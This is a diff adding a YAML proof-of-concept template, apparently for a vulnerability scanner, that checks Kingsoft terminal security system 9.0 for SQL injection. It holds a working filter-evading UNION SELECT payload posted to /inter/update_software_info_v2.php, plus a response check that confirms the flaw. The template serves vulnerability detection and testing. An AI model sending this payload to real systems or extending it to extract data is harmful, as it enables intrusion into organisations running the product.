@@ -1,0 +1,20 @@
+id: poc-yaml-jinkshan-terminal-security-system-sqli
+info:
+  name: 金山终端安全系统9.0-SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金山终端安全系统
+variables:
+  v1: random_int(100,1000)
+  v2: md5(v1)
+requests:
+- method: POST
+  path: /inter/update_software_info_v2.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'type=--1E0union/**/se#lect-1E0,2,1,md5({{.v1}}),5,6,7,8--&key=&pageCount=1&curPage=1
+
+    '
+  expression: status_code == 200 && contains(body, v2) && contains(body, "nResult")
+transport: http
